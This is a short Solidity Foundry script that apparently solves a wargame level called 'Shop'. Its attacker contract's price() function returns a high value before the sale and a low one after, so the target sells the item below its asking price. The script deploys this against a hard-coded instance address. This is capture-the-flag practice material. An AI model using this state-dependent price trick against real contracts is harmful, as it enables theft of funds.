// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract AttackShop {
    address level21;

    constructor(address _levelInstance) {
        level21 = _levelInstance;
    }

    function trigger() public {
        IShop(level21).buy();
    }

    function price() public view returns (uint256) {
        if (IShop(level21).isSold() == false) {
            return 100;
        } else {
            return 10;
        }
    }

    receive() external payable {}
}

contract ShopHack is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address shopAddress = 0x9094370bABCbFA9e2e763bE2684bF31a59664e63;
        AttackShop attackShop = new AttackShop(shopAddress);
        attackShop.trigger();
        vm.stopBroadcast();
    }
}
